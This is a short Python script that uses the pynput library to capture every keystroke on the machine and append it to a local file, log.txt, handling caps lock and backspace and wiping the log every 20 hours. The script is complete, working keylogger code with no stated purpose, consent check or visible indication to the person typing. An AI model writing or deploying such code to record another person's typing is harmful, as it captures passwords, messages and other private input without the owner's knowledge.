from pynput.keyboard import Listener, Key
import time

refresh_time_limit = 60 * 60 * 20  # 20 Hours

caps_lock_active = False
start_time = time.time()


def refresh_log_file():
    global start_time
    start_time = time.time()
    with open("log.txt", 'w') as f:
        f.write("")


def write_to_file(key):
    global caps_lock_active, start_time

    if time.time() - start_time > refresh_time_limit:
        refresh_log_file()

    if key == Key.space:
        letter = " "
    elif key == Key.shift or key == Key.shift_r or key == Key.shift_l:
        return
    elif key == Key.enter:
        letter = "\n"
    elif key == Key.tab:
        letter = "  "
    elif key == Key.ctrl_l or key == Key.alt_l:
        return
    elif key == Key.caps_lock:
        caps_lock_active = not caps_lock_active
        return
    elif key == Key.backspace:
        with open("log.txt", 'r') as f:
            content = f.read()
        with open("log.txt", 'w') as f:
            f.write(content[:-1])
        return
    else:
        letter = str(key)

    if caps_lock_active and key.char and len(key.char) == 1 and key.char.isalpha():
        letter = key.char.upper()

    with open("log.txt", 'a') as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()
